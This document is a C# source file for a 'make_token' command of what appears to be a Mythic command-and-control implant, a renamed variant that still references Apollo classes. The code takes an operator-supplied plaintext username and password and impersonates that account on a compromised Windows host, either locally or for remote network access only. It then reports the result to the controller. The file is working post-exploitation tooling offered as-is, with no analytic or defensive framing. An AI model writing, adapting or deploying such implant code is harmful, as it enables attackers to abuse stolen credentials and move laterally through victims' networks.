#define COMMAND_NAME_UPPER

#if DEBUG
#define MAKE_TOKEN
#endif

#if MAKE_TOKEN

using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Structs.MythicStructs;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;

namespace Tasks
{
    public class make_token : Tasking
    {
        [DataContract]
        internal struct MakeTokenParameters
        {
            [DataMember(Name = "credential")]
            public Credential Credential;
            [DataMember(Name = "netOnly")]
            public bool NetOnly;
        }
        public make_token(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }
        public override void Start()
        {
            MythicTaskResponse resp;
            MakeTokenParameters parameters = _dataSerializer.Deserialize<MakeTokenParameters>(_data.Parameters);
            if (string.IsNullOrEmpty(parameters.Credential.Account))
            {
                resp = CreateTaskResponse("Account name is empty.", true, "error");
            }
            else if (string.IsNullOrEmpty(parameters.Credential.CredentialMaterial))
            {
                resp = CreateTaskResponse("Password is empty.", true, "error");
            }
            else if (parameters.Credential.CredentialType != "plaintext")
            {
                resp = CreateTaskResponse("Credential material is not a plaintext password.", true, "error");
            }
            else
            {
                ApolloLogonInformation info = new ApolloLogonInformation(
                    parameters.Credential.Account,
                    parameters.Credential.CredentialMaterial,
                    parameters.Credential.Realm,
                    parameters.NetOnly);
                if (_agent.GetIdentityManager().SetIdentity(info))
                {
                    var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
                    if (parameters.NetOnly)
                    {
                        resp = CreateTaskResponse(
                        $"Successfully impersonated {cur.Name} for local access and {parameters.Credential.Realm}\\{parameters.Credential.Account} for remote access",
                        true,
                        "completed",
                        new ICommandMessage[] { Artifact.PlaintextLogon(cur.Name, true) });
                    } else
                    {
                        resp = CreateTaskResponse(
                        $"Successfully impersonated {cur.Name} for local and remote access",
                        true,
                        "completed",
                        new ICommandMessage[] { Artifact.PlaintextLogon(cur.Name, true) });
                    }
                }
                else
                {
                    resp = CreateTaskResponse(
                        $"Failed to impersonate {info.Username}: {Marshal.GetLastWin32Error()}",
                        true,
                        "error",
                        new ICommandMessage[] {Artifact.PlaintextLogon(info.Username)});
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif